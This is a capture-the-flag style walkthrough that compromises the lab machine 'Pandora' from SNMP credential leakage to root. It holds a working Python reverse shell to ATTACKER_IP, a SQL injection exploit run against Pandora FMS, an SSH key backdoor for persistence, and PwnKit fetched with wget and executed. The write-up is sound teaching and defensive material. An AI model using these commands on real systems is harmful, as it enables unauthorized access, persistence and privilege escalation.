````markdown
# PANDORA â€“ Linux Full Walkthrough

> âš ï¸ **Disclaimer**  
> This walkthrough was performed in a controlled lab environment with full authorization.  
> All actions are for **educational and defensive security purposes only**.

---

## ğŸ§­ Overview

* **Target**: Pandora
* **OS**: Linux (Ubuntu)
* **Goal**: User â†’ Root compromise
* **Techniques used**:
  * Network & Service Enumeration
  * SNMP Information Disclosure
  * Credential Reuse
  * Port Forwarding / Pivoting
  * SQL Injection Exploitation (Pandora FMS)
  * Reverse Shell
  * SSH Persistence
  * Privilege Escalation via SUID / PwnKit

---

## 1ï¸âƒ£ Enumeration

### ğŸ” Network & Service Discovery

```bash
nmap -sV -sC -Pn -v 10.129.4.67
````

**Key Findings**

* **22/tcp â€“ SSH** â†’ OpenSSH 8.2p1 Ubuntu
* **80/tcp â€“ HTTP** â†’ Apache 2.4.41 Ubuntu

This indicates a **Linux web server** with SSH access available.

---

### ğŸ” UDP Scan

```bash
nmap -sU --top-ports 500 10.129.4.67
```

**Interesting Port**

* **161/udp â€“ SNMP**

SNMP often leaks system and user information if misconfigured.

---

## 2ï¸âƒ£ SNMP Enumeration

```bash
snmp-check 10.129.4.67
```

### Information Extracted

* Hostname: `pandora`
* Contact: `Daniel`
* Location: `Mississippi`
* System Details: Ubuntu Kernel 5.4

### ğŸ”‘ Credentials Discovered

```text
Username: daniel
Password: HotelBabylon23'
```

â¡ï¸ SNMP misconfiguration directly exposed valid credentials.

---

## 3ï¸âƒ£ Initial Access â€“ SSH

```bash
ssh daniel@10.129.4.67
```

Verify access:

```bash
id
```

We now have a shell as **daniel**.

---

## 4ï¸âƒ£ Local Enumeration (User: daniel)

### Open Ports & Internal Services

```bash
ss -lntp
```

**Observation**

* MySQL running on `127.0.0.1:3306`
* Internal HTTP services

---

### Web Application Files

```bash
cd /var/www/pandora/pandora_console
ls
```

Files found:

* `pandoradb_data.sql`
* `ws.php`

---

### Apache Virtual Host Configuration

```bash
cd /etc/apache2/sites-available
cat pandora.conf
```

**Important Data**

```
ServerName pandora.panda.htb
DocumentRoot /var/www/pandora
AssignUserID matt matt
```

â¡ï¸ The web application runs under **user matt**, making it a lateral movement target.

---

## 5ï¸âƒ£ Port Forwarding â€“ Internal Web Access

From attacker machine:

```bash
ssh -L 1234:localhost:80 daniel@10.129.4.67
```

Browser access:

```
http://localhost:1234/pandora_console/
```

**Version Identified**

```
Pandora FMS v7.0NG.742
```

---

## 6ï¸âƒ£ Exploitation â€“ SQL Injection (CVE-2021-32099)

Pandora FMS `v7.0NG.742` is vulnerable to **Unauthenticated SQL Injection**.

### Public Exploit

```bash
python3 sqlpwn.py -t 127.0.0.1:1234 -f php-backdoor.php
```

Test command:

```
CMD > whoami
matt
```

We now execute commands as **matt**.

---

## 7ï¸âƒ£ Reverse Shell

### Listener (Attacker)

```bash
nc -lvnp 9001
```

### Python Payload

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Interactive shell obtained as **matt**.

---

## 8ï¸âƒ£ Persistence â€“ SSH Backdoor

### Attacker Machine

```bash
ssh-keygen
cat ~/.ssh/id_rsa.pub
```

### Target Machine

```bash
mkdir ~/.ssh
echo "PUBLIC_KEY" > ~/.ssh/authorized_keys
```

Test:

```bash
ssh matt@10.129.4.67
```

Persistent SSH access established.

---

## 9ï¸âƒ£ Privilege Escalation â€“ SUID Enumeration

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Interesting Binaries**

```
/usr/bin/pkexec
/usr/bin/pandora_backup
```

`pkexec` is vulnerable to **PwnKit**.

---

## ğŸ”Ÿ Root Exploit â€“ PwnKit

### Attacker Machine

```bash
python3 -m http.server
```

### Target Machine

```bash
wget http://ATTACKER_IP:8000/PwnKit
chmod +x PwnKit
./PwnKit
```

**Result**

```
root@pandora
```

ğŸ¯ **Root Access Achieved**

---

## ğŸ” Persistence Options

* SSH authorized_keys
* Cron jobs
* SUID binaries
* Web shells

SSH key persistence was chosen for stealth and simplicity.

---

## ğŸ›¡ï¸ Defensive Takeaways

* Disable or secure SNMP (change community strings)
* Restrict internal web applications
* Patch Pandora FMS vulnerabilities
* Audit SUID binaries regularly
* Monitor SSH authorized_keys changes
* Apply kernel and pkexec patches

---

## ğŸ Conclusion

This lab demonstrates how **information disclosure (SNMP)** combined with **web application vulnerabilities** and **misconfigured SUID binaries** can lead to **full system compromise**.
No brute force or zero-day exploits were required â€” only **enumeration, pivoting, and privilege escalation techniques**.

```
::contentReference[oaicite:0]{index=0}
```
